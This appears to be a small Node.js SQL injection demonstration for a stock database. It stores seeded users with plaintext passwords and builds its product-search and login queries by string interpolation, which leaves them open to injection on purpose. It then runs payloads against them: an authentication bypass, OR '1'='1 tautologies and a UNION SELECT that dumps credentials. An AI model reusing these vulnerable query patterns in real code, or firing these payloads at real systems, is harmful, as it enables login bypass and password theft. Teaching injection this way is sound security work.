
const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

// Ensure users table exists
db.exec(`
CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL,
  password TEXT NOT NULL,
  role TEXT DEFAULT 'attendant'
);
`);

db.exec(`
INSERT OR IGNORE INTO users (username, password, role) VALUES
('admin', 'admin123', 'admin'),
('fatuma', 'pass456', 'attendant'),
('wasswa', 'pass789', 'manager');
`);

function searchProduct(name) {
  const query = `SELECT * FROM products WHERE name LIKE '${name}'`;
  console.log("Query:", query);
  const rows = db.prepare(query).all();
  console.log("Result:", rows, "\n");
  return rows;
}

function login(username, password) {
  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  console.log("Query:", query);
  const row = db.prepare(query).get();
  console.log("Result:", row, "\n");
  return row;
}

// Attacks
searchProduct("' OR 1=1 -- ");
login("admin' -- ", "anything");
login("' OR '1'='1", "' OR '1'='1");
searchProduct("' UNION SELECT id, username, password, role FROM users -- ");
